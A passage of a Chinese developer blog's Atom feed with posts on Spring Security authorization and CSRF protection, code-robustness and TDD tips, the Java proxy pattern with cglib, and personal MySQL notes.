用户授权(基于角色或权限进行访问控制)"></a>6. 用户授权(基于角色或权限进行访问控制)</h3><h4 id="6-1-hasAuthority-方法"><a href="#6-1-hasAuthority-方法" class="headerlink" title="6.1 hasAuthority 方法"></a>6.1 hasAuthority 方法</h4><p>如果当前的主体具有指定的权限,则返回true,否则返回false</p><ul><li><p>在配置类中设置当前访问地址有哪些权限</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">//当前登录用户只有具有admins权限才可以访问这个路径.antMatchers("/test/index").hasAuthority("admin")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>在UserDetailsService,把返回的User对象设置权限</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">Users users=userMapper.selectOne("");//设置用户权限为管理员权限List<GrantedAuthority> auths=AuthorityUtils.commaSeparatedStringToAuthorityList("admin");UserDetailsSerivce userDetail=new User(users.getUserName,new BCryptPasswordEncoder().encode(users.getPassword()),auths);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="6-2-hasAnyAuthority-方法"><a href="#6-2-hasAnyAuthority-方法" class="headerlink" title="6.2 hasAnyAuthority 方法"></a>6.2 hasAnyAuthority 方法</h4><p>如果当前的主体有任何提供的角色(给定的作为一个逗号分隔的字符串列表)的话,返回true</p><pre><code>.anyMatchers(&quot;/test/index&quot;).hasAnyAuthority(&quot;admin,manager&quot;)</code></pre><h4 id="6-3-hasRole-方法"><a href="#6-3-hasRole-方法" class="headerlink" title="6.3 hasRole 方法"></a>6.3 hasRole 方法</h4><p>如果用户具备给定角色就允许访问,否则出现403</p><p>如果当前主体具有指定的角色,则返回true</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">.antMatchers("/test/index").hasRole("role")//源码中进行了封装, 需要添加ROLE_。//源码    return "hasRole('ROLE_"+role+"')";List<GrantedAuthority> auths=AuthorityUtils.commaSeparatedStringToAuthorityList("admin,ROLE_role");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意 : 配置文件中不需要添加”ROLE_”,因为上述的底层源码会自动添加与之进行匹配。</p><h4 id="6-4-hasAnyRole-方法"><a href="#6-4-hasAnyRole-方法" class="headerlink" title="6.4 hasAnyRole 方法"></a>6.4 hasAnyRole 方法</h4><p>表示用户具备任何一个条件都可以访问。</p><p>给用户添加角色:</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">//用户对象不为空返回当前用户return new User(username,user.getPassword(),AuthorityUtils.commaSeparatedStringToAuthorityList("admin,role,ROLE_admin,ROLE_role"));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改配置文件 :</p><pre><code>.antMatchers(&quot;/test/admin&quot;).hasAnyRole(&quot;role&quot;)</code></pre><h3 id="7-用户授权-自定义403页面"><a href="#7-用户授权-自定义403页面" class="headerlink" title="7. 用户授权(自定义403页面)"></a>7. 用户授权(自定义403页面)</h3><p>在配置类里面进行配置即可。</p><pre><code>http.execptionHandling().accessDeniedPage(&quot;/unauth&quot;);</code></pre><h3 id="8-用户授权-注解使用"><a href="#8-用户授权-注解使用" class="headerlink" title="8. 用户授权(注解使用)"></a>8. 用户授权(注解使用)</h3><h4 id="8-1-Secured"><a href="#8-1-Secured" class="headerlink" title="8.1 @Secured"></a>8.1 <a href="https://github.com/Secured" target="_blank" rel="noopener">@Secured</a></h4><p>判断是否具有角色,另外需要注意的是这里匹配的字符串需要添加前缀”ROLE_”。</p><p>使用注解要提前开启注解功能。</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@SpringBootApplication@EnableGlobalMethodSecurity(securedEnabled=true)public class DemosecurityApplication{    public static void main(String[] args){        SpringApplication.run(DemosecurityApplication.class,args);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在控制器方法上添加Controller</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@RequestMapping("testSecured")@ResponseBody@Secured({"ROLE_normal","ROLE_admin"})public String helloUser(){    return "hello,user";}@Secured({"ROLE_normal","Role_管理员"})<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-2-PreAuthorize"><a href="#8-2-PreAuthorize" class="headerlink" title="8.2 @PreAuthorize"></a>8.2 <a href="https://github.com/PreAuthorize" target="_blank" rel="noopener">@PreAuthorize</a></h4><p>先开启注解功能</p><p><a href="https://github.com/EnableGlobalMethodSecurity" target="_blank" rel="noopener">@EnableGlobalMethodSecurity</a>(prePostEnabled=true)</p><p><a href="https://github.com/PreAuthorize" target="_blank" rel="noopener">@PreAuthorize</a> : 注解适合进入方法前的权限验证,<a href="https://github.com/PreAuthorize" target="_blank" rel="noopener">@PreAuthorize</a> 可以将登录用户的roles/permissions参数传入到方法中。</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@RequestMapping("/preAuthorize")@ResponseBody@PreAuthorize("hasAnyAuthority('menu:system')")public String preAuthorize(){    System.out.println("preAuthorize");    return "preAuthorize";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-3-PostAuthorize"><a href="#8-3-PostAuthorize" class="headerlink" title="8.3 @PostAuthorize"></a>8.3 <a href="https://github.com/PostAuthorize" target="_blank" rel="noopener">@PostAuthorize</a></h4><p>先开启注解功能:</p><p><a href="https://github.com/EnableGlobalMethodSecurity" target="_blank" rel="noopener">@EnableGlobalMethodSecurity</a>(prePostEnabled=true)</p><p><a href="https://github.com/PostAuthorize" target="_blank" rel="noopener">@PostAuthorize</a> 注解使用并不多,在方法执行后再进行权限验证，适合验证带有返回值的权限</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@RequestMapping("/testPostAuthorize")@ResponseBody@PostAuthorzie("hasAnyAuthorize('menu:system')")public String preAuthorize(){    System.out.println("test-PostAuthorize");    return "PostAuthorize";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-4-PostFilter"><a href="#8-4-PostFilter" class="headerlink" title="8.4 @PostFilter"></a>8.4 <a href="https://github.com/PostFilter" target="_blank" rel="noopener">@PostFilter</a></h4><p><a href="https://github.com/PostFilter" target="_blank" rel="noopener">@PostFilter</a> : 权限验证之后对数据进行过滤,留下用户名是admin1的数据</p><p>表达式中的filterObject引用的是方法返回值List中的某一个元素</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@RequestMapping("getAll")@PreAuthorize("hasRole('ROLE_管理员')")@PostFilter("filterObject.username=='admin1'")@ResponseBodypublic List<UserInfo> getAllUser(){    ArrayList<UserInfo> list=new ArrayList<>();    list.add(new UserInfo(1l,"admin1","6666"));    list.add(new UserInfo(2l,"admin2","6666"));    return list;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8-5-PreFilter"><a href="#8-5-PreFilter" class="headerlink" title="8.5 @PreFilter"></a>8.5 <a href="https://github.com/PreFilter" target="_blank" rel="noopener">@PreFilter</a></h4><p><a href="https://github.com/PreFilter" target="_blank" rel="noopener">@PreFilter</a> : 进入控制器之前对数据进行过滤</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@RequestMapping("getTestPreFilter")@PreAuthorize("hasRole('ROLE_管理员')")@PreFilter(value="filterObject.id%2==0")@ResonseBodypublic List<UserInfo> getTestPreFilter(@RequestBody List<UserInfo> list){    list.forEach(t->{        System.out.println(t.getId()+"\t"+t.getUsername());    });}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9-用户注销"><a href="#9-用户注销" class="headerlink" title="9. 用户注销"></a>9. 用户注销</h3><p>在配置类中添加退出映射地址</p><pre><code>http.logout().logoutUrl(&quot;/logout&quot;).logoutSuccessUrl(&quot;/index&quot;).permitAll();</code></pre><h3 id="10-自动登录"><a href="#10-自动登录" class="headerlink" title="10. 自动登录"></a>10. 自动登录</h3><p><img src="/SpringSecurity/Hugo\hugo_0.75.1_Windows-64bit\blog\content\posts\SpringSecurity\rikcLoverikcLoveimage-20210210005345863.png" alt="image-20210210005345863"></p><p><img src="/SpringSecurity/Hugo\hugo_0.75.1_Windows-64bit\blog\content\posts\SpringSecurity\rikcLoverikcLoveimage-20210210005636400.png" alt="image-20210210005636400"></p><p>第一步 : 创建数据库表</p><pre class="line-numbers language-lang-sql"><code class="language-lang-sql">CREATE TABLE `persisent_logins`(    `username` varchar(64) NOT NULL,    `series` varchar(64) NOT NULL,    `token` varchar(64) NOT NULL,    `last_used` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,    PRIMARY KEY(`series`))ENGINE=InnoDB DEFAULT CHARSET=utf8;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二步 : 配置类,注入数据源,配置操作数据库对象</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@Autowiredprivate DataSource dataSource;@Beanpublic PersistentTokenRepository persistentTokenRespository(){    JdbcTokenRepositoryImpl jdbcTokenRepositoryImpl = new JdbcTokenRepositoryImpl();    jdbcTokenRepositoryImpl.setDataSource(dataSource);    //自动生成数据库表    //jdbcTokenRepositoryImpl.setCreateTableOnStartup(true);    return jdbcTokenRepositoryImpl;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-lang-java"><code class="language-lang-java">.and().rememberMe().tokenRespository(persistentTokenRepository())    .tokenValiditySeconds(60)//设置有效时长单位是秒    .userDetailsService(userDetailsService)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第三步 : 页面添加记住我复选框</p><pre><code>记住我 :&lt;input type=&quot;checkbox&quot; name=&quot;remember-me&quot; title=&quot;记住密码&quot;/&gt;&lt;br/&gt;此处 : name 属性必须为 remember-me,不能改为其他值</code></pre><h3 id="11-CSRF功能"><a href="#11-CSRF功能" class="headerlink" title="11. CSRF功能"></a>11. CSRF功能</h3><p>跨域请求伪造(英语 : Cross-site request forgery),也被称为one-clickattack或者session riding,通常缩写为CSRF或者XSRF,是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本(XSS)相比,XSS利用的是用户对指定网站的信任，CSRF利用的是网站对用户网页浏览器的信任。</p><p>跨域请求攻击，简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作(如发邮件，发消息，甚至财产操作如转账和购买商品)。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了Web中用户身份验证的一个漏洞 : <strong>==简单的身份验证只能保证请求发自某个用户的浏览器,却不能保证请求本身是用户自愿发出的。==</strong></p><p>从Spring Security 4.0 开始，默认情况下会开启CSRF保护，以防止CSRF攻击应用程序，Spring Security CSRF 会针对PATCH,POST,PUT和DELETE方法进行防护。</p><p>Spring Security 实现CSRF的原理 :</p><ul><li>生成csrfToken保存到HttpSession或者Cookie中.</li></ul><p>案例 :</p><p>在登录页面添加一个隐藏域 :</p><pre><code>&lt;input type=&quot;hidden&quot; th:if=&quot;${_csrf}!=null&quot; th:value=&quot;${_csrf.token}&quot; name=&quot;_csrf&quot;/&gt;</code></pre><p>关闭安全配置的类中的csrf :</p><pre><code>//http.csrf().disable();</code></pre><p>添加依赖</p><pre class="line-numbers language-lang-xml"><code class="language-lang-xml"><!--对thymeleaf添加 Spring Security标签支持--><dependency>    <groupId>org.thymeleaf.extras</groupId>    <artifactId>thymeleaf-extras-springsecurity5</artifactId></dependency><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SpringBoot整合SpringSecurity&quot;&gt;&lt;a href=&quot;#SpringBoot整合SpringSecurity&quot; class=&quot;headerlink&quot; title=&quot;SpringBoot整合SpringSecurity&quot;&gt;&lt;/a&gt;SpringBo
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Improve Robustness (2)</title>
    <link href="https://kayleh.top/improve-robustness-(2)/"/>
    <id>https://kayleh.top/improve-robustness-(2)/</id>
    <published>2021-05-12T18:49:03.000Z</published>
    <updated>2021-05-27T07:14:21.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TDD测试驱动开发"><a href="#TDD测试驱动开发" class="headerlink" title="TDD测试驱动开发"></a>TDD测试驱动开发</h1><p>用户提供的信息：</p><ul><li><p>用户昵称(长度最长为20个字节，即最长20个英文单词，10个汉字)(必须传入)</p></li><li><p>用户性别(1代表男，2代表女)(必须传入)</p></li><li><p>用户出生日期(格式为YYYY-MM-DD)(必须传入)</p></li><li><p>用户简介(长度最长为40个字节，即最长40个英文单词，20个汉字)(必须传入)</p></li></ul><p>异常情况：</p><ul><li>用户没有传入表明用户身份的uuid</li><li>用户传入了一个错误的uuid,即不存在的用户</li><li>用户没有传入必要的参数，比如缺少用户昵称，用户性别等</li><li>用户传了不合法的参数，比如传入了用户的密码</li><li>传入的用户昵称为null</li><li>传入的用户昵称为””(即空字符串)</li><li>传入的用户昵称长度大于20字节</li><li>传入的用户昵称为不支持的字符编码</li><li>传入的用户性别格式不正确，比如传入’woman’</li><li>传入的用户性别的取值不正确，比如传入了’3’</li><li>传入的用户出生日期格式不正确，比如传入的格式为’YYYY-MM-DD hh:mm:ss’</li><li>传入的用户出生日期取值不正确，比如现在是2017年，他传入的用户年份是2018或者1800，传入的月份是13,等</li><li>传入的用户简介为null</li><li>传入的用户简介为””(即空字符串)</li><li>传入的用户简介长度大于40字节</li><li>传入的用户简介为不支持的字符编码</li><li>用户传入了正确的数据但是返回的结果不正确</li></ul><h2 id="做回归测试"><a href="#做回归测试" class="headerlink" title="做回归测试"></a>做回归测试</h2><p>我们在修复一个issue,或者增加新的接口的时候，并不能确保我们的修改对其他接口没有影响．所以，我们还需要做回归测试．如果上面写了TDD的测试脚本，那这里我们只需要在这个脚本中新增新接口的测试用例，再执行一遍测试就Ok了．如果没有上面的那个脚本，这里你也很可能就会因为嫌麻烦而不做．</p><p>我们项目组中的成员，很多次就是因为没有执行回归测试，而导致新接口能用而旧接口失效的问题．</p><h2 id="将生产环境下数据库需要的约束同样加在开发环境下"><a href="#将生产环境下数据库需要的约束同样加在开发环境下" class="headerlink" title="将生产环境下数据库需要的约束同样加在开发环境下"></a>将生产环境下数据库需要的约束同样加在开发环境下</h2><p>数据库约束其实也是提高我们的代码健壮性的一个好帮手．比如，在新增用户的粉丝接口中(用户和粉丝的关系在一张单独的表中)，我们需要用户传入的粉丝id是一个存在的用户的uuid．如果不用约束，我们需要在代码中先遍历数据库来查询用户是否存在，而如果我们直接使用外键约束，让粉丝id是用户id的外键，那么我们只需要查看数据库是否返回违反外键约束的错误就能确定用户是否存在了．</p><p>在修改用户信息的那个例子中，如果你没有先写测试脚本，忘了判断用户昵称是否为空，而你数据库中，用户昵称字段有非空约束．通过传入空昵称时这个非空约束报的错误，你就能知道需要先判断用户昵称是否为空．</p><h2 id="永远不要认为你依赖的东西会正常工作"><a href="#永远不要认为你依赖的东西会正常工作" class="headerlink" title="永远不要认为你依赖的东西会正常工作"></a>永远不要认为你依赖的东西会正常工作</h2><p>作为一个后台微服务，我们一定会用到数据库，会用到缓存．如果你假设数据库不会宕机，并没有处理数据库宕机的代码，那你的代码永远都不够健壮．一旦数据库宕机，前台就会返回大量的500，有心人就会有可乘之机了．</p><h2 id="做压力测试"><a href="#做压力测试" class="headerlink" title="做压力测试"></a>做压力测试</h2><p>有的错误，如果你不做压力测试，是察觉不到的．比如，不正确的并发处理，死锁等问题．对于一个点赞接口来说，如果你用postman来进行测试，点一次结果正确，点两次结果正确，但是你并发的点一万次，结果可能就会因为并发处理不对而是9990了．</p><p>如果你没用数据库连接池，网络带宽足够大，并发执行十万次数据库写操作，数据库可能就会因此宕机(至少会有明显的网路延时)，这时候如果你的微服务如果对外提供正确的错误信息，那恭喜，你的代码足够健壮了．</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;TDD测试驱动开发&quot;&gt;&lt;a href=&quot;#TDD测试驱动开发&quot; class=&quot;headerlink&quot; title=&quot;TDD测试驱动开发&quot;&gt;&lt;/a&gt;TDD测试驱动开发&lt;/h1&gt;&lt;p&gt;用户提供的信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;用户昵称(长度最长为20个字节，即
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Improve Robustness (1)</title>
    <link href="https://kayleh.top/improve-robustness-(1)/"/>
    <id>https://kayleh.top/improve-robustness-(1)/</id>
    <published>2021-05-12T07:44:09.000Z</published>
    <updated>2021-05-12T15:51:22.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="提高代码鲁棒性——（1）"><a href="#提高代码鲁棒性——（1）" class="headerlink" title="提高代码鲁棒性——（1）"></a>提高代码鲁棒性——（1）</h1><ul><li>需要 Map 的主键和取值时，应该迭代 entrySet()</li></ul><p>当循环中只需要 Map 的主键时，迭代 keySet() 是正确的。但是，当需要主键和取值时，迭代 entrySet() 才是更高效的做法，比先迭代 keySet() 后再去 get 取值性能更佳。</p><p>反例：</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">Map<String,String> map = new HashMap();for(String key : map.keySet()){    String value = map.get(key);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正例：</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">Map<String,String> map = new HashMap();for(Map.Entry<String,String> entry:map.entrySet()){    String key = map.getKey();    String value = entry.getValue();    ...}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>不要让常量变成变量</li></ul><pre class="line-numbers language-lang-java"><code class="language-lang-java"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;提高代码鲁棒性——（1）&quot;&gt;&lt;a href=&quot;#提高代码鲁棒性——（1）&quot; class=&quot;headerlink&quot; title=&quot;提高代码鲁棒性——（1）&quot;&gt;&lt;/a&gt;提高代码鲁棒性——（1）&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;需要 Map 的主键和取值时，应该迭代 entr
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Proxy</title>
    <link href="https://kayleh.top/proxy/"/>
    <id>https://kayleh.top/proxy/</id>
    <published>2021-04-25T05:37:43.000Z</published>
    <updated>2021-04-25T13:44:45.051Z</updated>
    
    <content type="html"><![CDATA[<p>代理模式是一种经典的设计模式，代理的意义在于生成代理对象，在服务提供方和使用方之间充当一个媒介，控制真实对象的访问。</p><p>代理分为静态代理和动态代理两种。</p><p>静态代理需要通过手动或工具生成代理类并编译，代理类和委托类的关系在编译期就已经确定。动态代理允许开发人员在运行时动态的创建出代理类及其对象。</p><p>Spring AOP 的主要技术基础就是 Java 的动态代理机制。</p><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>静态代理的实现需要一个接口(表示要完成的功能)，一个真实对象和一个代理对象(两者都需实现这个接口)。</p><p>示例如下：</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">interface Shopping {    void buy();}class Client implements Shopping {    public void buy() {        System.out.println("我想买这件商品");    }}class StaticProxy implements Shopping {    private Shopping shopping;    public StaticProxy(Shopping shopping) {        this.shopping = shopping;    }    public void buy() {        System.out.println("降价促销，疯狂大甩卖了！");        shopping.buy();    }}public class StaticProxyTest {    public static void main(String[] args) {        Client client = new Client();        StaticProxy service = new StaticProxy(client);        service.buy();    }}-----------------------------------------输出结果：降价促销，疯狂大甩卖了！我想买这件商品<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>动态代理可以让我们在运行时动态生成代理类，解耦程度更高。Java 动态代理的实现主要借助于 java.lang.reflect 包中的 Proxy 类与 InvocationHandler 接口，所有对动态代理对象的方法调用都会转发到 InvocationHandler 中的 invoke() 方法中实现。一般我们称实现了 InvocationHandler 接口的类为调用处理器。</p><p>我们可以通过 Proxy 的静态工厂方法 newProxyInstance 创建动态代理类实例。</p><p>方法如下：</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">public static Object newProxyInstance(ClassLoader loader,                                          Class<?>[] interfaces,                                          InvocationHandler h)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>loader：类加载器<br>interfaces：类实现的全部接口<br>h：调用处理器</p></blockquote><p>示例如下：</p><pre><code>public class DynamicProxy implements InvocationHandler {    private Object target = null;    DynamicProxy(Object target) {        this.target = target;    }    /**     * 代理方法逻辑     *     * @param proxy  代理对象     * @param method 调度方法     * @param args   调度方法参数     */    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {        System.out.println(&quot;代理前&quot;);        method.invoke(target, args);        System.out.println(&quot;代理后&quot;);        return null;    }}</code></pre><pre class="line-numbers language-lang-java"><code class="language-lang-java">public class DyProxyTest {    public static void main(String[] args) {        Shopping client = new Client();        DynamicProxy dyProxy = new DynamicProxy(client);        Shopping shop = (Shopping) Proxy.newProxyInstance(Shopping.class.getClassLoader(), new Class[]{Shopping.class}, dyProxy);        shop.buy();    }}输出结果：代理前我想买这件商品代理后<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然我们也可以将 Proxy.newProxyInstance 方法放到调用处理器中，使客户端编程更为简单。</p><p>示例如下：</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">public class DynamicProxy implements InvocationHandler {    private Object target = null;    DynamicProxy() {    }    DynamicProxy(Object target) {        this.target = target;    }    public Object bind(Object target) {        this.target = target;        return Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), this);    }    /**     * 代理方法逻辑     *     * @param proxy  代理对象     * @param method 调度方法     * @param args   调度方法参数     */    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {        System.out.println("代理前");        method.invoke(target, args);        System.out.println("代理后");        return null;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-lang-java"><code class="language-lang-java">public class DyProxyTest {    public static void main(String[] args) {        Shopping client = new Client();        DynamicProxy dyProxy = new DynamicProxy();        Shopping shop = (Shopping) dyProxy.bind(client);        shop.buy();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h3><p>拦截器主要就是靠动态代理实现，它可以简化动态代理的使用，我们只需要知道拦截器接口的使用方法即可，无须知道动态代理的实现细节。</p><p>示例如下：</p><pre><code>public interface Interceptor {    public boolean before(Object proxy, Object target, Method method, Object[] args);    public void around(Object proxy, Object target, Method method, Object[] args);    public void after(Object proxy, Object target, Method method, Object[] args);}public class MyInterceptor implements Interceptor {    @Override    public boolean before(Object proxy, Object target, Method method, Object[] args) {        System.out.println(&quot;before&quot;);        return false;    }    @Override    public void around(Object proxy, Object target, Method method, Object[] args) {        System.out.println(&quot;around&quot;);    }    @Override    public void after(Object proxy, Object target, Method method, Object[] args) {        System.out.println(&quot;after&quot;);    }}</code></pre><pre class="line-numbers language-lang-java"><code class="language-lang-java">public class InterceptorProxy implements InvocationHandler {    private Object target = null;    Interceptor interceptor = null;    InterceptorProxy(Interceptor interceptor) {        this.interceptor = interceptor;    }    public Object bind(Object target) {        this.target = target;        return Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), this);    }    /**     * 代理方法逻辑     *     * @param proxy  代理对象     * @param method 调度方法     * @param args   调度方法参数     */    @Override    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {        if (interceptor == null) {            method.invoke(target, args);        }        Object result = null;        if (interceptor.before(proxy, target, method, args)) {            result = method.invoke(target, args);        } else {            interceptor.around(proxy, target, method, args);        }        interceptor.after(proxy, target, method, args);        return result;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输出结果：</p><p>before<br>around<br>after</p></blockquote><p>开发者只需要知道拦截器的作用，设置拦截器，因而相对简单一些。</p><p>拦截器在 Spring AOP 与 Spring MVC 中都有应用。在 Spring AOP 中，</p><ul><li>针对接口做代理默认使用的是 JDK 自带的 Proxy+InvocationHandler</li><li>针对类做代理使用的是 Cglib</li></ul><p>在 Spring MVC中， 主要通过 HandlerInterceptor 接口实现拦截器的功能。</p><p>HandlerInterceptor 接口中包含3个方法：</p><ul><li>preHandle：执行 controller 处理之前执行，返回值为true时接着执行 postHandle 和 afterCompletion，返回false则中断执行</li><li>postHandle：在执行 controller 后，ModelAndView 处理前执行</li><li>afterCompletion ：在执行完 ModelAndView 之后执行<br>此外，Spring MVC 提供了抽象类 HandlerInterceptorAdapter，实现了 HandlerInterceptor 接口。</li></ul><h3 id="cglib"><a href="#cglib" class="headerlink" title="cglib"></a>cglib</h3><p>因为 Java 自带的动态代理工具必须要有一个接口，cglib 不需要接口，只需要一个非抽象类就能实现动态代理。</p><p>示例如下：</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">class ClientProxy implements MethodInterceptor {    @Override    public Object intercept(Object proxy, Method method, Object[] args, MethodProxy methodProxy) throws Throwable {        System.out.println("before");        Object obj = methodProxy.invokeSuper(proxy, args);        System.out.println("after");        return obj;    }}public class CglibTest {    public static void main(String[] args) {        ClientProxy clientProxy = new ClientProxy();        Enhancer enhancer = new Enhancer();        enhancer.setSuperclass(Client.class);        enhancer.setCallback(clientProxy);        Client client = (Client) enhancer.create();        client.buy();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>输出结果：</p><p>before<br>我想买这件商品<br>after</p></blockquote><p>————————————————<br>版权声明：本文为CSDN博主「情谊风月」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_43320847/article/details/82938754" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43320847/article/details/82938754</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;代理模式是一种经典的设计模式，代理的意义在于生成代理对象，在服务提供方和使用方之间充当一个媒介，控制真实对象的访问。&lt;/p&gt;
&lt;p&gt;代理分为静态代理和动态代理两种。&lt;/p&gt;
&lt;p&gt;静态代理需要通过手动或工具生成代理类并编译，代理类和委托类的关系在编译期就已经确定。动态代理允
      
    
    </summary>
    
    
    
      <category term="java" scheme="https://kayleh.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>todoList</title>
    <link href="https://kayleh.top/note/"/>
    <id>https://kayleh.top/note/</id>
    <published>2021-04-23T07:53:25.000Z</published>
    <updated>2021-05-25T07:13:19.807Z</updated>
    
    <content type="html"><![CDATA[<h4 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h4><h4 id="TodoList"><a href="#TodoList" class="headerlink" title="TodoList"></a>TodoList</h4><ul><li><a href="https://www.cnblogs.com/lenve/p/11242055.html" target="_blank" rel="noopener">https://www.cnblogs.com/lenve/p/11242055.html</a></li></ul><p><strong>数据库</strong></p><ul><li><p>数据库查询不能整表查询，应创建实体类接收返回给前端</p></li><li><p>bit类型数据是 int类型(1&amp;0)</p></li><li><p>SQLException：TimeZone</p><ul><li><p>解决方式:在连接数据库的url后加上serverTimezone=UTC，完整的url为:</p><pre class="line-numbers language-lang-html"><code class="language-lang-html">url=jdbc:mysql://localhost:3306/spring_cache?useUnicode=true&characterEncoding=UTF8&serverTimezone=UTC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>mysqldump 设置字符集</p><ul><li><pre class="line-numbers language-lang-cmd"><code class="language-lang-cmd">mysqldump -u root -p --default-character-set=utf8mb4 dev > D:/dev.sql--------alter table `table_name` convert to character set utf8mb4;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>mybatis-plus：SQL脚本固定字段</p><pre class="line-numbers language-lang-mysql"><code class="language-lang-mysql">CREATE TABLE `table` (  `_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '??定义表',  `id` varchar(50) NOT NULL DEFAULT '' COMMENT '主键Id',  `deleted` 